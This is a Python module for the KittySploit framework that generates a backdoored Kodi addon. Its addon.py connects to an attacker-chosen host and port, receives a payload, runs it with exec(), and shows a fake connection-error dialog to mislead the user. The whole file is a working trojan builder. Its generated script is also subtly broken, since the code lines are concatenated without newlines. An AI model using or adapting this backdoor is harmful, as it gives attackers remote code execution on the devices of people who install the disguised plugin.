from kittysploit import *
import zipfile
import os

class Module(Backdoor):
	
	__info__ = {
		'name': 'Kodi Plugin Generator',
		'description': 'Kodi Plugin Generator for Kodi 19',
		'author': 'KittySploit Team',
		'arch': [Arch.X86, Arch.X64],
	}

	lhost = OptIP('','Connect-back IP address', True)
	lport = OptPort(5555,'Connect-back TCP Port', True)

	addon_name = OptString("Kodi Plugin", "Addon Name", True)
	addon_id = OptString("kodi.leet.plugin", "Addon ID", True)
	addon_desc = OptString("Kodi Plugin", "Addon Description", True)

	def addonXml(self):
		
		addonxml = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
		addonxml += '<addon id="'+self.addon_id+'" name="'+self.addon_name+'" version="1.0.0" provider-name="luka">'
		addonxml += '	<requires>'
		addonxml += '		<import addon="xbmc.python" version="2.14.0"/>'
		addonxml += '	</requires>'
		addonxml += '	<extension point="xbmc.python.script" library="addon.py">'
		addonxml += '		<provides>executable</provides>'
		addonxml += '	</extension>'
		addonxml += '	<extension point="xbmc.addon.metadata">'
		addonxml += '		<platform>all</platform>'
		addonxml += '		<summary lang="en">'+self.addon_name+'</summary>'
		addonxml += '		<description lang="en">'+self.addon_desc+'</description>'
		addonxml += '		<license>GNU General Public License, v2</license>'
		addonxml += '		<language></language>'
		addonxml += '		<email>webmaster@localhost</email>'
		addonxml += '		<assets>'
		addonxml += '			<icon>resources/icon.png</icon>'
		addonxml += '			<fanart>resources/fanart.jpg</fanart>'
		addonxml += '		</assets>'
		addonxml += '		<news>'+self.addon_desc+'</news>'
		addonxml += '	</extension>'
		addonxml += '</addon>'
		
		print_status("Xml file generated")
		self.write_out_dir("KodiBackdoor/addon.xml", addonxml)

	def addonPy(self):
		
		addon = "import xbmcaddon"
		addon += "import xbmcgui"
		addon += "import socket,struct"
		addon += "addon       = xbmcaddon.Addon()"
		addon += "addonname   = addon.getAddonInfo('name')"
		addon += "line1 = 'Error!'"
		addon += "line2 = 'An error occurred'"
		addon += "line3 = 'Connection to server failed... please try again later'"
		addon += "s=socket.socket(2,1)"
		addon += "s.connect(('"+self.lhost+"',"+str(self.lport)+"))"
		addon += "l=struct.unpack('>I',s.recv(4))[0]"
		addon += "d=s.recv(4096)"
		addon += "while len(d)!=l:"
		addon += "	d+=s.recv(4096)"
		addon += "exec(d,{'s':s})"
		addon += "xbmcgui.Dialog().ok(addonname, line1, line2, line3)"
		
		self.write_out_dir("KodiBackdoor/addon.py", addon)
		
	def zipdir(self, path, ziph, base_path):
		"""Add directory contents to zip file with proper relative paths"""
		for root, dirs, files in os.walk(path):
			for file in files:
				file_path = os.path.join(root, file)
				# Calculate relative path from base_path for arcname
				arcname = os.path.relpath(file_path, base_path)
				ziph.write(file_path, arcname)

	def run(self):
		print_status("Directory created")
		create_dir = self.create_dir("KodiBackdoor")
		if not create_dir:
			print_error("Error creating directory")
			return False
		
		self.addonXml()
		self.addonPy()
		
		# Get the output directory path
		output_dir = os.path.join(os.getcwd(), "output")
		kodi_dir = os.path.join(output_dir, "KodiBackdoor")
		zip_path = os.path.join(output_dir, self.addon_id + '.zip')
		
		print_status("Putting everything in ZIP file...")
		try:
			zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
			self.zipdir(kodi_dir, zipf, output_dir)
			zipf.close()
			print_success(f"ZIP file created: {zip_path}")
			return True
		except Exception as e:
			print_error(f"Error creating ZIP file: {e}")
			return False
